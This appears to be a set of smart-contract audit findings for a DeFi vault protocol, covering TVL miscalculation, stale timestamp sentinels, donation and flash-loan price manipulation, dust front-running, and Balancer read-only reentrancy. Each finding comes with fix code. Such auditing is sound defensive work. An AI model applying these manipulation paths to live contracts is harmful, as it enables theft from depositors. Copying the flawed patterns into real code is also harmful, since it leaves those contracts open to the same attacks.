In `contracts/helpers/TVLHelper.sol`, `getLatestUpdateTime` is implemented as:

```solidity
function getLatestUpdateTime(uint256 vaultId, PositionRegistry registry) public view returns (uint256) {
    uint256 latestUpdateTime;
    HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
    for (uint256 i = 0; i < positions.length; i++) {
        if (latestUpdateTime == 0 || positions[i].positionTimestamp < latestUpdateTime) {
            latestUpdateTime = positions[i].positionTimestamp;
        }
    }
    if (latestUpdateTime == 0) {
        latestUpdateTime = block.timestamp;
    }
    return latestUpdateTime;
}
```

This logic contains a fundamental sentinel and freshness integrity flaw in lines 41–46:

1. **Ambiguous Zero Sentinel and Order-Dependent Aggregation (`42`, `45`–`46`):**
   `latestUpdateTime` is initialized to `0` (`42`), and the loop condition checks `if (latestUpdateTime == 0 || positions[i].positionTimestamp < latestUpdateTime)` (`45`). If any position in `positions` has `positionTimestamp == 0` (indicating an unupdated position or zero timestamp), `latestUpdateTime` is set to `0` on that iteration (`46`).
   - If that position is not the last element in `positions`, on the very next iteration `i + 1` the check `latestUpdateTime == 0` evaluates to `true`, unconditionally overwriting `0` with `positions[i + 1].positionTimestamp`. Thus, an unupdated position with `positionTimestamp == 0` is completely ignored whenever another position appears after it in `holdingPositions`.
   - If that position is the last element in `positions` (or all positions have `positionTimestamp == 0`), the loop terminates with `latestUpdateTime == 0`. Line 49 (`if (latestUpdateTime == 0) latestUpdateTime = block.timestamp;`) then treats `0` as "no positions needed an update" and fails open by returning `block.timestamp` instead of `0`.

2. **Mismatch with `PositionRegistry` Sentinel (`type(uint256).max`) and Unfiltered Placeholder Positions (`43`–`46`):**
   In `PositionRegistry.addVault` (line 141), index `0` of `holdingPositions` is initialized as a dummy placeholder `HoldingPI(address(0), address(0), bytes32(0), "", "", type(uint256).max)`, and `PositionRegistry.updateHoldingPosition` (line 319) initializes newly created holding positions with `positionTimestamp = type(uint256).max`.
   - Unlike `TVLHelper.getTVL` (lines 19–21), `getLatestUpdateTime` does not skip the dummy position at index `0` (`calculatorConnector == address(0)`).
   - On iteration `i = 0`, `latestUpdateTime == 0` is satisfied and `latestUpdateTime` is set to `type(uint256).max`. If no position has a smaller timestamp (or when a cross-chain/delayed position is first registered via `updateHoldingPosition` before its TVL is reported), `getLatestUpdateTime` returns `type(uint256).max` rather than `block.timestamp` (or `0` for unupdated positions), rendering the fallback on lines 49–51 unreachable.

Consequently, `getLatestUpdateTime` fails to enforce that all positions requiring off-chain/cross-chain TVL updates have been refreshed since `recordTime`, allowing `calculateDepositShares` and `calculateWithdrawShares` to price shares using stale or uninitialized TVL.

findings.remediation:
Initialize the accumulator to `type(uint256).max` instead of `0`, skip the dummy placeholder position at index `0` (`calculatorConnector == address(0)`), and do not use `0` as an "unset" sentinel inside the loop or overwrite `0` with `block.timestamp` after the loop. Only fall back to `block.timestamp` when no positions have an explicit timestamp `< type(uint256).max`.

```solidity
    function getLatestUpdateTime(uint256 vaultId, PositionRegistry registry) public view returns (uint256) {
        uint256 latestUpdateTime = type(uint256).max;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            if (positions[i].positionTimestamp < latestUpdateTime) {
                latestUpdateTime = positions[i].positionTimestamp;
            }
        }
        if (latestUpdateTime == type(uint256).max) {
            latestUpdateTime = block.timestamp;
        }
        return latestUpdateTime;
    }
```

Track the total amount of all unexecuted pending deposits in `depositQueue` (incrementing `depositQueue.totalAWFDeposit` immediately in `deposit()` when tokens are transferred into `AccountingManager`, or maintaining a dedicated pending-deposit counter from `first` to `last`) and subtract that full pending balance in `TVL()`.

If a dedicated `totalPendingDeposits` field (incremented in `deposit()` and decremented in `executeDeposit()`) is maintained on `depositQueue` (or if `totalAWFDeposit` is updated in `deposit()` instead of `calculateDepositShares()`), `TVL()` should subtract all unexecuted deposits:

```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
            - depositQueue.totalPendingDeposits;
    }
```

findings.technical_details:
In `contracts/accountingManager/AccountingManager.sol`, the vault's total value locked (`TVL`) is the core valuation metric used by `totalAssets()` (line 592) for ERC4626 share conversions and by `getProfit()` (line 583) for calculating vault profits:

1. In `TVL()` (lines 627–630), the contract sums the TVL across all registered holding positions with its own live `baseToken` balance minus queued deposits:
   ```solidity
   return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
       - depositQueue.totalAWFDeposit;
   ```
2. In `getPositionTVL()` (lines 632–640), for standard ERC20 token holding positions (`p.positionTypeId == 0`), the contract reads the live ERC20 balance of the connector address decoded from `position.data` and converts it into `base` units via `_getValue()` / `valueOracle.getValue()`:
   ```solidity
   address token = abi.decode(p.data, (address));
   uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
   return _getValue(token, base, amount);
   ```

Because neither `AccountingManager.TVL()` nor `AccountingManager.getPositionTVL()` tracks internal accounting balances for `baseToken` held in `AccountingManager` or ERC20 tokens held in connectors, any direct ERC20 transfer (donation) of `baseToken` to `AccountingManager` or of a tracked `token` to a connector immediately increases `TVL()`.

This creates a manipulable valuation dependency:
- **Share Price & Exchange Rate Manipulation (`totalAssets`)**: `totalAssets()` directly returns `TVL()`. An attacker can donate tokens to `AccountingManager` or an active connector prior to `calculateDepositShares()` or `calculateWithdrawShares()` to skew the ERC4626 share-to-asset exchange rate (enabling share inflation/rounding attacks when supply is low or diluting incoming depositors).
- **Profit & Performance Fee Distortion (`getProfit`)**: `getProfit()` computes `tvl + totalWithdrawnAmount - totalDepositedAmount`. Any unsolicited token transfer increases `tvl` without increasing `totalDepositedAmount`, causing `getProfit()` to report artificial profit, inflating performance fees and permanently skewing the high-water mark.

findings.remediation:
Track internal accounting balances for `baseToken` held by `AccountingManager` and for ERC20 tokens held by connectors rather than relying on raw `IERC20.balanceOf` queries in `TVL()` and `getPositionTVL()`.

```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + trackedBaseTokenBalance
            - depositQueue.totalAWFDeposit;
    }

    function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
        PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
        if (p.positionTypeId == 0) {
            address token = abi.decode(p.data, (address));
            address holder = abi.decode(position.data, (address));
            uint256 amount = IConnector(holder).getTrackedBalance(token);
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

findings.technical_details:
In `contracts/accountingManager/AccountingManager.sol`, the vault's total value locked is computed in `TVL()` (lines 627–630), which directly backs `totalAssets()` (lines 591–593) and `getProfit()` (lines 582–588):

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

`TVLHelper.getTVL()` (`contracts/helpers/TVLHelper.sol`, lines 14–34) iterates over all holding positions registered in `PositionRegistry` for `vaultId`, accumulating non-debt position values into `totalTVL` and debt position values (`registry.isPositionDebt(vaultId, positions[i].positionId) == true`) into `totalDebt`:

```solidity
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```

Because `TVLHelper.getTVL()` floors at `0` when `totalTVL < totalDebt` before returning to `AccountingManager.TVL()`, liability netting is performed only against assets currently held inside connectors rather than against the vault's aggregate assets across both connectors and `AccountingManager`.

This creates an asset-liability netting inconsistency in two scenarios:

1. **Unnetted excess connector debt when `AccountingManager` holds `baseToken`**: When a connector borrows `baseToken` (recording a debt position in `PositionRegistry` where `isDebt == true`) and transfers those borrowed `baseToken` funds to `AccountingManager` (for example, to service withdrawals or reallocate liquidity), or when connector collateral depreciates below `totalDebt` while idle `baseToken` resides in `AccountingManager`, the connector's `totalDebt` exceeds `totalTVL`. `TVLHelper.getTVL()` clamps the deficit `totalDebt - totalTVL` to `0`, and `AccountingManager.TVL()` adds `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit` without deducting the remaining unpaid debt `totalDebt - totalTVL`.
2. **Unhanded underflow when net connector value is wiped out by debt**: If `TVLHelper.getTVL()` is reduced by connector debt such that `TVLHelper.getTVL(...) + baseToken.balanceOf(address(this)) < depositQueue.totalAWFDeposit`, `AccountingManager.TVL()` reverts due to arithmetic underflow instead of returning `0`.

findings.remediation:
Compute the vault's aggregate assets (both connector assets and `AccountingManager`'s `baseToken` balance) before netting out `totalDebt` and `depositQueue.totalAWFDeposit`, and guard against underflow if total liabilities exceed total assets:

```solidity
    function TVL() public view returns (uint256) {
        uint256 totalTVL = baseToken.balanceOf(address(this));
        uint256 totalDebt = depositQueue.totalAWFDeposit;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], address(baseToken));
            if (registry.isPositionDebt(vaultId, positions[i].positionId)) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
        if (totalTVL <= totalDebt) {
            return 0;
        }
        return totalTVL - totalDebt;
    }
```

In `PositionRegistry.updateHoldingPosition`, use `ownerConnector` instead of `calculatorConnector` when updating `vault.isPositionUsed` for the swapped holding position:

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
            vault.isPositionUsed[holdingPositionId] = 0;
            emit HoldingPositionUpdated(vaultId, _positionId, _data, additionalData, removePosition, positionIndex);
            return type(uint256).max;
        }
```

findings.technical_details:
The `HoldingPI` struct tracks each active holding position in a vault along with a `positionTimestamp` field indicating when the position information was last updated:

```solidity
struct HoldingPI {
    address calculatorConnector;
    address ownerConnector;
    bytes32 positionId;
    bytes data;
    bytes additionalData;
    uint256 positionTimestamp;
}
```

When a vault is initialized in `PositionRegistry.addVault` (line 141), a dummy placeholder position is pushed at index `0` of `vault.holdingPositions` with `positionTimestamp` set to `type(uint256).max` so that minimum-timestamp aggregations (such as `TVLHelper.getLatestUpdateTime`, which iterates over `holdingPositions` to determine the oldest update timestamp across all held positions) ignore the placeholder entry at index `0`.

As documented in the NatSpec for `updateHoldingPostionWithTime` (lines 368–369):
> `@dev Same as updateHoldingPosition but with a positionTimestamp parameter`
> `@dev in scenarios where the positionTimestamp is not the current time (e.g. when we have positions on other chains)`

`updateHoldingPosition` is intended to record the current block timestamp (`block.timestamp`) whenever a holding position is added or updated on the current chain, whereas `updateHoldingPostionWithTime` overrides `positionTimestamp` when the update originated at an earlier timestamp on another chain.

However, the internal `PositionRegistry.updateHoldingPosition` function (lines 311–326) contains two flaws in how `positionTimestamp` is handled:

1. **Sentinel value used instead of `block.timestamp` on creation (line 319):** When `index == 0` (a new holding position is added), `HoldingPI` is pushed with `positionTimestamp` set to `type(uint256).max` rather than `block.timestamp`.
2. **Missing `positionTimestamp` update on existing position modification (line 324):** When `index != 0` (an existing holding position is updated), line 324 updates `vault.holdingPositions[index].additionalData = AD`, but fails to update `vault.holdingPositions[index].positionTimestamp` to `block.timestamp`.

Because `updateHoldingPosition` never records `block.timestamp`, any local holding position added or updated through `updateHoldingPosition` retains `type(uint256).max` (the uninitialized sentinel value), and any existing position whose `positionTimestamp` was previously set retains its old timestamp even after its `additionalData` is modified via `updateHoldingPosition`.

findings.remediation:
Set `positionTimestamp` to `block.timestamp` when pushing a new `HoldingPI` struct (`index == 0`) and update `vault.holdingPositions[index].positionTimestamp = block.timestamp` when modifying an existing holding position (`index != 0`).

```solidity
    function updateHoldingPosition(
        Vault storage vault,
        uint256 vaultId,
        bytes32 _positionId,
        bytes calldata d,
        bytes calldata AD,
        uint256 index,
        bytes32 holdingPositionId
    ) internal returns (uint256) {
        emit HoldingPositionUpdated(vaultId, _positionId, d, AD, false, index);

        if (index == 0) {
            if (!isPositionTrustedForConnector(vaultId, _positionId, msg.sender)) {
                revert InvalidPosition(_positionId);
            }
            if (vault.holdingPositions.length >= maxNumHoldingPositions) {
                revert TooManyPositions();
            }
            vault.isPositionUsed[holdingPositionId] = vault.holdingPositions.length;
            vault.holdingPositions.push(
                HoldingPI(
                    vaults[vaultId].trustedPositionsBP[_positionId].calculatorConnector,
                    msg.sender,
                    _positionId,
                    d,
                    AD,
                    block.timestamp
                )
            );
            return vault.holdingPositions.length - 1;
        }
        vault.holdingPositions[index].additionalData = AD;
        vault.holdingPositions[index].positionTimestamp = block.timestamp;
        return index;
    }
```

findings.technical_details:
`PositionRegistry` manages connector permissions per vault through `vault.connectors[connector].enabled`. A vault maintainer can revoke a connector's active permission by calling `addConnector(vaultId, _connectorAddresses, _enableds)` with `_enableds[i] = false` (lines 188–198). Disabling a connector causes `isAnActiveConnector` (line 499) and `isAddressTrusted` (line 525) to return `false`, which prevents other connectors and the accounting manager from sending new funds to the disabled connector.

However, in `PositionRegistry.updateHoldingPosition` (lines 335–347):

```solidity
function updateHoldingPosition(
    uint256 vaultId,
    bytes32 _positionId,
    bytes calldata _data,
    bytes calldata additionalData,
    bool removePosition
) public vaultExists(vaultId) returns (uint256) {
    Vault storage vault = vaults[vaultId];
    if (!vault.connectors[msg.sender].enabled) revert UnauthorizedAccess();
    if (!vault.trustedPositionsBP[_positionId].isEnabled) revert InvalidPosition(_positionId);
    bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
    uint256 positionIndex = vault.isPositionUsed[holdingPositionId];
    if (positionIndex == 0 && removePosition) return type(uint256).max;
```

Line 343 requires `vault.connectors[msg.sender].enabled` to be `true` regardless of whether the caller is opening/updating a position (`removePosition == false`) or cleaning up an existing position (`removePosition == true`).

Across the protocol's connectors, unwinding external positions and withdrawing token balances require calling `registry.updateHoldingPosition` with `removePosition = true`:
- `Dolomite.closeBorrowPosition` (lines 98–104) repays debt and calls `registry.updateHoldingPosition(..., true)`.
- `GearBoxV3.closeAccount` (lines 41–52) closes the credit account and calls `registry.updateHoldingPosition(..., true)`.
- `PrismaConnector.closeTrove` (lines 129–136) closes the trove and calls `registry.updateHoldingPosition(..., true)`.
- `BaseConnector._updateTokenInRegistry` (lines 135–146) calls `registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", true)` whenever a token balance is fully withdrawn or transferred back to the accounting manager.
- `OmnichainManagerBaseChain.updateTVL` (lines 32–43) calls `registry.updateHoldingPostionWithTime` with `removePosition = (tvl <= DUST_LEVEL)`.

Because line 343 rejects calls from disabled connectors even when `removePosition == true` and `positionIndex > 0`, revoking a connector's permission immediately blocks all position-closing operations and full token withdrawals from that connector. In addition, the orphaned entries in `vault.holdingPositions` cannot be removed, permanently occupying slots against `maxNumHoldingPositions` and causing `removeTrustedPosition` (lines 266–281) to revert with `CannotRemovePosition`.

findings.remediation:
Allow a disabled connector to remove its existing holding positions when `removePosition` is `true`, while continuing to require `vault.connectors[msg.sender].enabled` when adding or updating positions (`!removePosition`).

```solidity
    function updateHoldingPosition(
        uint256 vaultId,
        bytes32 _positionId,
        bytes calldata _data,
        bytes calldata additionalData,
        bool removePosition
    ) public vaultExists(vaultId) returns (uint256) {
        Vault storage vault = vaults[vaultId];
        bytes32 holdingPositionId = keccak256(abi.encode(msg.sender, _positionId, _data));
        uint256 positionIndex = vault.isPositionUsed[holdingPositionId];
        if (!vault.connectors[msg.sender].enabled && !(removePosition && positionIndex != 0)) {
            revert UnauthorizedAccess();
        }
        if (!vault.trustedPositionsBP[_positionId].isEnabled) revert InvalidPosition(_positionId);
        if (positionIndex == 0 && removePosition) return type(uint256).max;
```

findings.technical_details:
In `PositionRegistry`, token trust is scoped per connector via `vault.connectors[_connectorAddress].trustedTokens[token]` (managed through `updateConnectorTrustedTokens`), while global vault tokens are stored under `vault.connectors[vault.accountManager].trustedTokens[token]`. The helper `PositionRegistry.isTokenTrusted(vaultId, token, connector)` returns `true` if a token is trusted either globally on `accountManager` or specifically on `connector`. Furthermore, `IConnector` defines the custom error `IConnector_UntrustedToken(address token)` intended to prevent connectors from holding tokens they are not authorized to manage.

However, in `BaseConnector._updateTokenInRegistry(address token, bool remove)` (lines 135–146):

```solidity
function _updateTokenInRegistry(address token, bool remove) internal {
    (address accountingManager,) = registry.getVaultAddresses(vaultId);
    bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
    uint256 positionIndex =
        registry.getHoldingPositionIndex(vaultId, positionId, address(this), abi.encode(address(this)));
    if ((positionIndex == 0 && !remove) || (positionIndex > 0 && remove)) {
        emit UpdateTokenInRegistry(token, remove);
        registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove);
    }
}
```

And in `BaseConnector.transferPositionToAnotherConnector` (lines 122–132):

```solidity
if (registry.isAnActiveConnector(vaultId, connector)) {
    IConnector(connector).addLiquidity(tokens, amounts, data);
}
```

This creates two coupled position-registry integrity flaws:

1. **Bypass of per-connector token restrictions**: Because `_updateTokenInRegistry` derives `positionId` using `accountingManager` as `calculatorConnector`, the trusted position blueprint (`PositionBP`) in `PositionRegistry` must be registered with `calculatorConnector = accountingManager` and `onlyOwner = false`. When `registry.updateHoldingPosition` is subsequently called by a connector, `isPositionTrustedForConnector(vaultId, _positionId, msg.sender)` only verifies `position.isEnabled && (!position.onlyOwner || position.calculatorConnector == connector)`. Neither `BaseConnector._updateTokenInRegistry` nor `PositionRegistry.updateHoldingPosition` checks `registry.isTokenTrusted(vaultId, token, address(this))`. As a result, any active connector can receive and register any token that has an enabled type-`0` position on `accountingManager` (for example, via `transferPositionToAnotherConnector`, `addLiquidity`, or `swapHoldings`), even if the maintainer explicitly disabled or never enabled that token for the connector via `updateConnectorTrustedTokens`.
2. **Inability to register connector-specific trusted tokens**: When a maintainer whitelists a token exclusively for a specific connector `C` via `updateConnectorTrustedTokens(vaultId, C, [token], true)` (without whitelisting it globally on `accountingManager`), `addTrustedPosition(vaultId, 0, accountingManager, false, false, abi.encode(token), "")` reverts with `TokenNotTrusted(token)` because `isTokenTrusted(vaultId, token, accountingManager)` is `false`. Conversely, if the maintainer adds the type-`0` trusted position with `calculatorConnector = C`, `BaseConnector._updateTokenInRegistry` still looks up `calculatePositionId(accountingManager, 0, abi.encode(token))`, causing `registry.updateHoldingPosition` to revert with `InvalidPosition(positionId)`.

findings.remediation:
Validate that the token is trusted for `address(this)` in `_updateTokenInRegistry` when registering a token holding position (or allow per-connector token position IDs when a token is only trusted for a specific connector):

```solidity
    function _updateTokenInRegistry(address token, bool remove) internal {
        if (!remove && !registry.isTokenTrusted(vaultId, token, address(this))) {
            revert IConnector_UntrustedToken(token);
        }
        (address accountingManager,) = registry.getVaultAddresses(vaultId);
        // the value function is inside the accounting manager contract (so we can use the accounting manager address as the calculator connector)
        bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
        // if the token is not in the registry, we add it or remove it if the remove flag is true
        uint256 positionIndex =
            registry.getHoldingPositionIndex(vaultId, positionId, address(this), abi.encode(address(this)));
        if ((positionIndex == 0 && !remove) || (positionIndex > 0 && remove)) {
            emit UpdateTokenInRegistry(token, remove);
            registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove);
        }
    }
```

findings.technical_details:
In `BaseConnector.sol`, holding positions for raw ERC20 tokens held by a connector are tracked in `PositionRegistry` and updated via `updateTokenInRegistry(address token)` (lines 153–155) and `_updateTokenInRegistry(address token)` (lines 158–160):

```solidity
function updateTokenInRegistry(address token) public onlyManager {
    _updateTokenInRegistry(token);
}

function _updateTokenInRegistry(address token) internal {
    _updateTokenInRegistry(token, IERC20(token).balanceOf(address(this)) == 0);
}
```

`_updateTokenInRegistry(address token)` is invoked at the end of `sendTokensToTrustedAddress`, `addLiquidity`, `swapHoldings`, and directly via `updateTokenInRegistry`. It calls `_updateTokenInRegistry(address token, bool remove)` (lines 135–146), which calls `registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove)`.

Because `remove` is set to `true` only when `IERC20(token).balanceOf(address(this)) == 0`:
1. Any anyone can directly transfer `1` wei (dust) of `token` to the `BaseConnector` contract before `_updateTokenInRegistry(token)` executes (e.g., by front-running `swapHoldings`, `sendTokensToTrustedAddress`, or `updateTokenInRegistry`).
2. After the connector transfers or swaps out its intended token balance, `IERC20(token).balanceOf(address(this))` remains `>= 1` instead of `0`.
3. As a result, `remove` evaluates to `false`, and the holding position is not removed from `vault.holdingPositions` in `PositionRegistry`.
4. `PositionRegistry.updateHoldingPosition` (lines 308–310) enforces a strict cap on the number of active holding positions per vault (`if (vault.holdingPositions.length >= maxNumHoldingPositions) revert TooManyPositions();`, where `maxNumHoldingPositions` defaults to `20` and is capped at `MAX_NUM_HOLDING_POSITIONS = 40`).
5. Additionally, `PositionRegistry.removeTrustedPosition` (lines 274–278) reverts with `CannotRemovePosition(vaultId, _positionId)` if any element in `vault.holdingPositions` still has `positionId == _positionId`.

Even though `BaseConnector` declares `uint256 public DUST_LEVEL = 1;` on line 31, `_updateTokenInRegistry` checks for an exact zero balance (`== 0`), and `updateTokenInRegistry` provides no way for the manager to force-remove a dust position or sweep residual dust when updating the registry.

findings.remediation:
Allow the connector to treat balances below a configurable dust threshold as empty or allow the manager to specify an adjustable dust threshold / sweep residual dust before evaluating whether the token position should be removed from the registry:

```solidity
    function updateTokenInRegistry(address token, uint256 dustLevel) public onlyManager {
        DUST_LEVEL = dustLevel;
        _updateTokenInRegistry(token);
    }

    /// @notice adds or removes the token position to the registry based on the balance of the token
    function _updateTokenInRegistry(address token) internal {
        _updateTokenInRegistry(token, IERC20(token).balanceOf(address(this)) <= DUST_LEVEL);
    }
```

findings.technical_details:
The `BalancerConnector` contract is initialized with both `BAL` and `AURA` token addresses (lines 48–49) to handle rewards earned from staking Balancer Pool Tokens (BPT) into Aura Finance reward pools (`IRewardPool`).

When `harvestAuraRewards` (lines 53–59) is invoked by the manager:
```solidity
function harvestAuraRewards(address[] calldata rewardsPools) public onlyManager nonReentrant {
    for (uint256 i = 0; i < rewardsPools.length; i++) {
        IRewardPool baseRewardPool = IRewardPool(rewardsPools[i]);
        baseRewardPool.getReward();
    }
    _updateTokenInRegistry(address(AURA));
}
```
In Aura Finance (a fork of Convex Finance for Balancer), calling `getReward()` on a `BaseRewardPool` claims the primary Balancer reward token (`BAL`) and mints/transfers corresponding `AURA` tokens to `address(this)`.

In Noya's accounting architecture (as seen in `BaseConnector._updateTokenInRegistry` at lines 135–146 and `CurveConnector.harvestConvexRewards` at lines 247–255 which updates both `CVX` and `CRV`), every token held by a connector must be registered in `PositionRegistry` via `_updateTokenInRegistry` so that the `AccountingManager` includes its balance when computing the vault's Total Value Locked (TVL).

Because `harvestAuraRewards` only calls `_updateTokenInRegistry(address(AURA))` at line 58 and fails to call `_updateTokenInRegistry(address(BAL))`, the connector's newly acquired `BAL` balance is not recorded as a holding position in `PositionRegistry`. As a result, the vault's TVL calculation ignores the harvested `BAL` rewards until `updateTokenInRegistry(BAL)` is manually called or another operation updates `BAL` in the registry.

findings.remediation:
Update `harvestAuraRewards` in `BalancerConnector.sol` to also register the `BAL` token in `PositionRegistry` via `_updateTokenInRegistry`.

```solidity
    function harvestAuraRewards(address[] calldata rewardsPools) public onlyManager nonReentrant {
        for (uint256 i = 0; i < rewardsPools.length; i++) {
            IRewardPool baseRewardPool = IRewardPool(rewardsPools[i]);
            baseRewardPool.getReward();
        }
        _updateTokenInRegistry(address(AURA));
        _updateTokenInRegistry(address(BAL));
    }
```

findings.technical_details:
In `contracts/connectors/BalancerConnector.sol`, `_getPositionTVL` computes the Total Value Locked (TVL) of the connector's Balancer Pool Token (BPT) holdings (`lpBalance`, which sums direct BPT holdings and Aura-staked shares from `totalLpBalanceOf`):

```solidity
function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
    PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
    PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
    uint256 lpBalance = totalLpBalanceOf(pool);
    (, uint256[] memory _tokenBalances,) = IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
    uint256 _totalSupply = IERC20(pool.pool).totalSupply();

    uint256 _weight = pool.weights[pool.tokenIndex];

    uint256 token1bal = valueOracle.getValue(pool.tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
    return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
}
```

Line 172 computes the position value as:
$$\text{TVL} = \frac{10^{18} \times \text{token1bal} \times \text{lpBalance}}{\text{\_weight} \times \text{\_totalSupply}}$$

This valuation logic is flawed in three interconnected ways:

1. **Reserve-Based Valuation Manipulation**: The formula extrapolates the entire pool's TVL from the instantaneous spot balance of a single token (`_tokenBalances[pool.tokenIndex]`) valued via `valueOracle`. An attacker can take a flash loan and swap into or out of `pool.tokens[pool.tokenIndex]` within the Balancer pool. Because `token1bal` scales directly with the raw reserve of that single token while `_weight` and `_totalSupply` remain static during a swap, the reported TVL increases or decreases linearly with the manipulated reserve of `pool.tokens[pool.tokenIndex]`.
2. **Pool-Weight Valuation Model Mismatch**: Dividing `token1bal` by `_weight` assumes a Balancer Weighted Pool where the value of token $i$ is always a fixed fraction $w_i$ of the total pool value. This invariant does not hold for Balancer Stable / ComposableStable pools (such as the `vanillaUsdcDaiUsdt` pool configured in `BalancerConnector.t.sol`), where token balances can be arbitrarily imbalanced across stable assets without fixed weights. Even in Weighted Pools, any divergence between the pool's internal spot ratio and the external oracle price causes `(1e18 * token1bal) / _weight` to misstate the true pool value.
3. **Nominal vs. Effective LP Supply Mismatch**: Balancer pools that use pre-minted BPT (such as `ComposableStablePool` and newer `WeightedPool` versions) mint `type(uint112).max` (`~5.19e33`) BPT to the Balancer Vault upon creation. Using `IERC20(pool.pool).totalSupply()` (`_totalSupply`) instead of `getActualSupply()` divides the position value by the massive pre-minted supply, causing line 172 to evaluate to `0` (or near zero) for pre-minted pools.

findings.remediation:
For Weighted Pools, calculate the invariant-based manipulation-resistant BPT value using the geometric mean of oracle prices and weights, or when valuing by underlying reserves (with oracle/spot deviation checks), sum the oracle values of all non-BPT underlying tokens in the pool and divide by the pool's effective supply (`getActualSupply()`):

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
        PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
        PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
        uint256 lpBalance = totalLpBalanceOf(pool);
        (address[] memory tokens, uint256[] memory _tokenBalances,) =
            IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
        uint256 _totalSupply = IBalancerPool(pool.pool).getActualSupply();

        uint256 totalPoolValue;
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == pool.pool) continue;
            totalPoolValue += _getValue(tokens[i], base, _tokenBalances[i]);
        }
        return (totalPoolValue * lpBalance) / _totalSupply;
    }
```

*(Note: To fully prevent flash-loan reserve manipulation on volatile pools, use Balancer's invariant math with oracle prices—i.e., $V_{\text{BPT}} = \frac{k}{S} \prod \left(\frac{P_i}{w_i}\right)^{w_i}$ for Weighted Pools and `getRate()` with the minimum oracle price for Stable Pools—or enforce a maximum deviation check between pool spot prices and `valueOracle` prices.)*

findings.technical_details:
In `contracts/connectors/BalancerConnector.sol`, `_getPositionTVL` computes the value of the connector's Balancer LP holdings (`lpBalance`) as follows:

```solidity
function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
    PositionBP memory PTI = registry.getPositionBP(vaultId, p.positionId);
    PoolInfo memory pool = abi.decode(PTI.additionalData, (PoolInfo));
    uint256 lpBalance = totalLpBalanceOf(pool);
    (, uint256[] memory _tokenBalances,) = IBalancerVault(balancerVault).getPoolTokens(pool.poolId);
    uint256 _totalSupply = IERC20(pool.pool).totalSupply();

    uint256 _weight = pool.weights[pool.tokenIndex];

    uint256 token1bal = valueOracle.getValue(pool.tokens[pool.tokenIndex], base, _tokenBalances[pool.tokenIndex]);
    return (((1e18 * token1bal * lpBalance) / _weight) / _totalSupply);
}
```

In Balancer V2's `Vault` (`PoolBalances._exitPool`), exiting a pool executes in the following order:
1. The Vault invokes `pool.onExitPool(...)`, which immediately burns the exiting user's BPT, decreasing `IERC20(pool.pool).totalSupply()` in storage.
2. The Vault iterates through the pool tokens to transfer the withdrawn assets to the recipient, updating the balances array only in memory during the loop. When native ETH (or a token with transfer hooks) is sent to the recipient, control is handed to the recipient's `receive()` callback before the loop finishes.
3. Only after all asset transfers complete does the Vault write the updated token balances to storage via `_setPoolBalances`.

Because `BalancerConnector._getPositionTVL` does not verify that the Balancer Vault's reentrancy guard is not entered (e.g., via Balancer's `VaultReentrancyLib.ensureNotInVaultContext`), an external contract receiving ETH during `exitPool` can re-enter the Noya protocol while the Balancer Vault is in an inconsistent state:
- `IERC20(pool.pool).totalSupply()` (line 167) returns the **new, reduced** BPT total supply.
- `IBalancerVault(balancerVault).getPoolTokens(pool.poolId)` (line 166) reads storage and returns the **old, pre-exit** `_tokenBalances`.

Consequently, `token1bal / _totalSupply` is calculated from an inconsistent snapshot, inflating the reported value of the Balancer LP position and the overall Noya vault TVL (`TVLHelper.getTVL`).

findings.remediation:
Check that the Balancer Vault is not currently in a reentrant execution context before querying pool state in `_getPositionTVL` (using Balancer's `VaultReentrancyLib.ensureNotInVaultContext`):

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256) {
